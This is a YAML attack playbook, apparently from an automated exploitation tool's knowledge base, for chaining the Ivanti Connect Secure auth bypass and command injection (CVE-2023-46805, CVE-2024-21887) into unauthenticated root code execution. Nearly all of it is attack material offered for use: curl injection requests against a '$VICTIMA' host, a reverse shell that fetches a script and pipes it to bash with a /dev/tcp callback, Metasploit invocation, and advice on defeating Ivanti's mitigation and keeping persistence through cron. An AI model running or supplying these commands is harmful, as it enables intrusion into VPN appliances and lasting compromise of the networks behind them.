chain_id: ivanti_cs_cve_2023_46805_cve_2024_21887
title: "Ivanti Connect Secure — CVE-2023-46805 auth bypass + CVE-2024-21887 cmd injection (chained unauth RCE)"
severity: CRITICAL
tags: [web, ivanti, ics, ipsec, cve-2023-46805, cve-2024-21887, auth-bypass, command-injection, rce]

trigger:
  any_of:
    - { kind: "CVE-2023-46805" }
    - { kind: "CVE-2024-21887" }
    - { banner_pattern: "(?i)ivanti|pulse\\s*secure|connect\\s*secure|policy\\s*secure" }
    - { product_pattern: "(?i)ivanti.*(connect|policy)\\s*secure" }
    - { path_pattern: "(?i)/api/v1/totp/user-backup-code|/dana-na/auth/url_default" }

description: |
  Ivanti Connect Secure / Policy Secure 9.x and 22.x: a path-traversal
  in the auth layer (CVE-2023-46805) lets an unauthenticated request
  reach `/api/v1/license/keys-status/...`-style endpoints, and a
  command-injection in `/api/v1/totp/user-backup-code` (CVE-2024-21887)
  runs arbitrary shell as root. Chain them together: one curl, no
  auth, RCE. Volexity caught state-actor exploitation in Dec 2023.

steps:
  - id: 1
    title: "Fingerprint version (banner + admin login page)"
    command: |
      curl -sk "https://$VICTIMA/dana-na/auth/url_default/welcome.cgi" -I
      curl -sk "https://$VICTIMA/dana-na/" | grep -Eo '[0-9]+\.[0-9]+R[0-9]+\.[0-9]+'

  - id: 2
    title: "Chained one-shot — auth bypass + command injection"
    command: |
      curl -sk -X POST \
        "https://$VICTIMA/api/v1/totp/user-backup-code/../../license/keys-status/;id" \
        -H 'Content-Type: application/json' -d '{}'

  - id: 3
    title: "Reverse shell"
    command: |
      nc -lvnp 4444
      curl -sk -X POST \
        "https://$VICTIMA/api/v1/totp/user-backup-code/../../license/keys-status/;curl%20http://10.0.2.15/sh|bash" \
        -H 'Content-Type: application/json' -d '{}'
      # On 10.0.2.15:
      #   echo 'bash -i >& /dev/tcp/10.0.2.15/4444 0>&1' > /tmp/sh
      #   python3 -m http.server 80 --directory /tmp

  - id: 4
    title: "Public PoCs"
    command: |
      git clone https://github.com/rapid7/metasploit-framework /tmp/msf 2>/dev/null
      msfconsole -qx 'use exploit/linux/http/ivanti_connect_secure_rce_cve_2024_21887; \
        set RHOSTS $VICTIMA; set LHOST 10.0.2.15; set LPORT 4444; run'
      # Or:
      git clone https://github.com/rapid7/metasploit-framework
      git clone https://github.com/yqcs/CVE-2024-21887 /tmp/cve21887

common_errors:
  - error: "404 on /api/v1/totp/user-backup-code"
    solution: |
      Patched build (≥9.1R18.3 / 22.5R2.2 / 22.6R2.2) or admin disabled
      MFA. Try the alt-path `/api/v1/configuration/users/user-roles/...`.
  - error: "Web shell drops but mitigations re-spawn it dead"
    solution: |
      Ivanti's mitigation XML kills processes that don't match a
      whitelist. Survive by hooking from the integrity-checker tool
      itself or via cron entries created during the RCE window.

references:
  - https://nvd.nist.gov/vuln/detail/CVE-2023-46805
  - https://nvd.nist.gov/vuln/detail/CVE-2024-21887
  - https://www.volexity.com/blog/2024/01/10/active-exploitation-of-two-zero-day-vulnerabilities-in-ivanti-connect-secure-vpn/
